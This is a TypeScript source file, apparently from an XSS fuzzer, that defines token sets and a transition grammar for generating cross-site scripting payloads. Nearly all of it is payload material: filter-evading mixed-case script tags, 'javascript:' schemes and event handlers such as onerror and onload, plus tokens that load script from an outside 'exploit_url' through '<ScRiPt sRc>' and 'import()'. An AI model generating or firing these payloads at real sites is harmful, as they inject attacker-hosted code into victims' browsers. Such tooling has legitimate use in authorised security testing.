import { config } from "../config";

export type TokenValue = string;
export type TokenType = string;

export interface TokenDefinition {
	sets: {[key: TokenType]: TokenValue[]},
	transitions: {[key: TokenType]: TokenType[]}
};

const callback_urls = [
	`"${config.exploit_url}"`,
	`'${config.exploit_url}'`,
	`\`${config.exploit_url}\``
];

const callbacks = [
	`import("${config.exploit_url}")`,
	`import('${config.exploit_url}')`,
	`import(\`${config.exploit_url}\`)`,
];

export const xssTokens: TokenDefinition = {
	sets: {
		inline: [
			"jAvAsCriPt:"
		],

		trigger_exploits: [
			callbacks[0],
			callbacks[1],
			callbacks[2],
		],

		exploits: [
			`<ScRiPt sRc=${callback_urls[0]}></ScRiPt>`,
			`<ScRiPt sRc=${callback_urls[1]}></ScRiPt>`,
			`<ScRiPt sRc=${callback_urls[2]}></ScRiPt>`,
		],

		literal_tokens: [
			" ",
			';',
			',',
			'\'',

			'/',
			'<!--',
			'-->',
			'--!>',
			'(',
			')',

			'/*',
			"-",
			"`",
			"'",
			'"',
			"*",
			'*/',
			'\x20', // | |
			'\x27', // |'|
		],

		open: [ // <
			'<',
			'&lt;',
			'\x3c',
		],

		pre_token: [
			'/'
		],

		html_tokens: [
			'sCrIpT',
			'iMg',
			'sVg',
		],

		trigger_tokens: [
			' oNLoAd=',
			' oNeRrOr=',
			' onClICk=',
			' oNFoCus=',
			' OnBlUr=',
			' oNtOgGle=',
			' oNmOuSeLeaVe=',
			' oNmOuSeOveR=',
		],

		// will be directly closed
		html_break_only_tokens: [
			'a',
			'bUtTon',
			'iNpUt',
			'frAmEsEt',
			'teMplAte',
			'auDio',
			'viDeO',
			'sOurCe',
			'hTmL',
			'nOeMbed',
			'noScRIpt',
			'StYle',
			'ifRaMe',
			'xMp',
			'texTarEa',
			'nOfRaMeS',
			'tITle',
		],

		pre_close: [
			'/'
		],

		close: [ // >
			'&gt;',
			'>',
			'\x3e',
		],
	},

	transitions: {
		inline: ["inline", "trigger_exploits", "literal_tokens"],
		open: ["html_tokens", "pre_token"],
		pre_token: ["html_tokens", "html_break_only_tokens"],
		html_tokens: ["literal_tokens", "trigger_tokens"],
		html_break_only_tokens: ["close"],
		pre_close: ["close"],
		close: [/*any*/],

		exploits: [/*any*/],
		html_breaker: [/*any*/],
		literal_tokens: [/*any*/],
		pre_trigger_token: ["trigger_tokens"],
		trigger_tokens: ["trigger_exploits", "literal_tokens"],
		trigger_exploits: ["trigger_tokens", "pre_close", "close", "literal_tokens"]
	}
}

/**
 * The same tokens, but without the grammar.
 */
export const xssTokensNoGrammar: TokenDefinition = {...xssTokens}
xssTokensNoGrammar["transitions"] = {
	inline: [/*any*/],
	open: [/*any*/],
	pre_token: [/*any*/],
	html_tokens: [/*any*/],
	html_break_only_tokens: [/*any*/],
	pre_close: [/*any*/],
	close: [/*any*/],
	exploits: [/*any*/],
	html_breaker: [/*any*/],
	literal_tokens: [/*any*/],
	pre_trigger_token: [/*any*/],
	trigger_tokens: [/*any*/],
	trigger_exploits: [/*any*/],
}

function createTokens(sets: {[key: TokenType]: TokenValue[]}) {
	const getUniqueId = (() => {
		let tokenId = 1;
		return () => {
			return tokenId++;
		}
	})();

	const tokens: Token[] = [];
	const groupedTokens: {[key: TokenType]: Token[]} = {};

	Object.keys(sets).forEach((tokenType: TokenType) => {
		const tokensInSet = sets[tokenType].map((tokenValue) => {
			return new Token(getUniqueId(), tokenValue);
		});

		groupedTokens[tokenType] = tokensInSet;
		tokensInSet.forEach((token) => {
			tokens.push(token);
		});
	});

	return [tokens, groupedTokens] as [Token[], {[key: TokenType]: Token[]}];
}

function addTransitions(groupedTokens: {[key: TokenType]: Token[]}, transitions: {[key: TokenType]: TokenType[]}) {
	const groupedTokensKeys: TokenType[] = Object.keys(groupedTokens);

	groupedTokensKeys.forEach((tokenType: TokenType) => {
		const tokenSet = groupedTokens[tokenType];
		const nextTokenTypes = transitions[tokenType]?.length > 0 ? transitions[tokenType]: groupedTokensKeys;
		const nextTokens = nextTokenTypes.flatMap((nextType) => {
			return groupedTokens[nextType]
		});

		tokenSet.forEach((token) => {
			token.setNextTokens(nextTokens);
		});
	});
}

function createTokenSets(definition: TokenDefinition) {
	const [tokens, groupedTokens] = createTokens(definition.sets);

	addTransitions(groupedTokens, definition.transitions);

	return tokens;
}

export class Token {
	id: number;
	value: string;
	nextTokens: Token[];

	constructor(id: number, token: string) {
		this.id = id;
		this.value = token;
		this.nextTokens = [];
	}

	getNextTokens() {
		return this.nextTokens;
	}

	setNextTokens(nextTokens: Token[]) {
		this.nextTokens = nextTokens;
	}

	toJSON(includeTransitions = false) {
		if (includeTransitions) {
			return {
				id: this.id,
				value: this.value,
				nextTokens: this.nextTokens.map((token) => token.id)
			};
		} else {
			return {
				id: this.id,
				value: this.value
			};
		}
	}
}

class TokenSet {
	tokens: Token[];

	constructor(tokens: Token[]) {
		this.tokens = tokens;
	}
}

export enum TOKEN_TYPES {
	XSS_TOKENS,
	XSS_TOKENS_NO_GRAMMAR
}

export interface TokenFactory {
	getTokens(): Token[];
}

export class TokenProvider implements TokenFactory {
	tokens: Token[];

	constructor(type: TOKEN_TYPES) {
		switch (type) {
			case TOKEN_TYPES.XSS_TOKENS:
				this.tokens = createTokenSets(xssTokens);
				break;
			case TOKEN_TYPES.XSS_TOKENS_NO_GRAMMAR:
				this.tokens = createTokenSets(xssTokensNoGrammar);
				break;
			default:
				throw `Unrecognized token types ${type}`;
		}
	}

	getTokens(): Token[] {
		return this.tokens;
	}
}
